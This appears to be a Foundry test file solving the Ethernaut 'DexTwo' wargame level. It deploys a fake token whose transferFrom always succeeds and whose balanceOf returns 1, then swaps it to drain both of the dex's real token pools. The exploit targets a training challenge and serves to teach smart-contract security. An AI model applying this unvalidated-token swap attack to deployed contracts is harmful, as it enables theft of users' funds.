// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

interface IDexTwo {
  function token1() external returns(address);
  function token2() external returns(address);
  function swap(address from, address to, uint amount) external;
}

contract NoToken {
  function transferFrom(address, address, uint256) public pure returns (bool) {
    return true;
  }
  function balanceOf(address) public pure returns(uint256) {
    return 1;
  }
}

contract DexTwoTest is Test {
  function testExploit() public {
    address challengeAddress = utils.createLevelInstance(0x5026Ff8C97303951c255D3a7FDCd5a1d0EF4a81a);

    IDexTwo dex = IDexTwo(challengeAddress);

    NoToken noToken = new NoToken();

    // will get 1 * (100/ 1) = 100.
    dex.swap(address(noToken), dex.token1(), 1);
    dex.swap(address(noToken), dex.token2(), 1);

    utils.submitLevelInstance(challengeAddress);
  }
}
